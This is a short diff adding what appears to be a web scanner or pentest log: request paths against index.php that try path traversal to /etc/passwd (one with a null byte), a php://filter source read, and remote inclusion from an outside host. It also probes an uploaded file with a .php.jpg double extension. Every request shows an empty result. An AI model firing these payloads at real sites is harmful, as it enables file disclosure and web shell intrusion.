@@ -1,0 +1,10 @@
+-- /index.php?url=../../../../etc/passwd
+[000 0B] 
+-- /index.php?url=php://filter/convert.base64-encode/resource=index
+[000 0B] 
+-- /index.php?url=../../../etc/passwd%00
+[000 0B] 
+-- /index.php?url=http://badgurlz
+[000 0B] 
+-- /public/uploads/slider/1792397083_test123.php.jpg
+[000 0B] 
